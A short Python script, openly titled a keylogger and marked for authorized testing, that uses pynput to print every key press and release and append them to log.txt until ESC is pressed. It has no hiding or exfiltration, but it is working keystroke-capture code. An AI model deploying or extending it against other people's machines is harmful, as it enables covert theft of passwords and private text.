#!/usr/bin/env python3
# keylogger.py – For personal/authorized testing only.
# Works on Debian (aarch64) with pynput

from pynput.keyboard import Listener

LOGFILE = "log.txt"


def write_log(line: str):
    with open(LOGFILE, "a+", encoding="utf-8") as f:
        f.write(line + "\n")


def on_press(key):
    try:
        line = f"alphanumeric key {key.char} pressed"
    except AttributeError:
        line = f"special key {key} pressed"

    print(line)
    write_log(line)


def on_release(key):
    try:
        line = f"'{key.char}' released"
    except AttributeError:
        line = f"special key {key} released"

    print(line)
    write_log(line)

    if key == key.esc:
        print("ESC pressed — exiting.")
        return False  # Stop the listener


if __name__ == '__main__':
    print("Keylogger started. Press ESC to quit.")
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
